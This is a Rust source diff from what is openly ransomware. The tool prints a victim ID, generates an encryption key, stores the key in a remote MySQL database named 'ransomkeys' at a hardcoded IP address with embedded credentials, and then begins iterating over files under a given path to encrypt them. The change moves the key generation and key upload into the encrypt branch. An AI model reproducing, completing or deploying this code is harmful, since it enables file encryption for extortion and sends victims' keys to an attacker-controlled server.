@@ -58,24 +58,24 @@ fn create_table(uuid: String, conn: &mut PooledConn, key: String) {
 }
 
 fn main() -> Result<(), Box<dyn Error>>{
-	println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
-	let assigned_uuid = Uuid::new_v4();
-	let newest_string = assigned_uuid.to_string().replace("-", "").replace(" ", "");
-	println!("{}", newest_string);
 	let args: Vec<String> = std::env::args().collect();
 	if args.len() < 3 {
 		println!("Usage: {} <encrypt/decrypt> <path>", args[0]);
 		exit(1);
 	}
 	let path = &args[2];
-	let secret_key53 = orion::aead::SecretKey::default();
-	let seckey65 = secret_key53.unprotected_as_bytes();
 	let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
 	let pool = Arc::new(Pool::new(url).unwrap());
 	let mut conn = pool.get_conn().unwrap();
-	let enc6432 = general_purpose::STANDARD.encode(seckey65);
-	create_table(newest_string, &mut conn, enc6432);
 			if args[1] == "encrypt" {
+				println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
+				let assigned_uuid = Uuid::new_v4();
+				let newest_string = assigned_uuid.to_string().replace("-", "").replace(" ", "");
+				println!("{}", newest_string);
+				let secret_key53 = orion::aead::SecretKey::default();
+				let seckey65 = secret_key53.unprotected_as_bytes();
+				let enc6432 = general_purpose::STANDARD.encode(seckey65);
+				create_table(newest_string, &mut conn, enc6432);
 				let files = getfiles(path)?;
 				for file in files {
 					let filee324 = file;
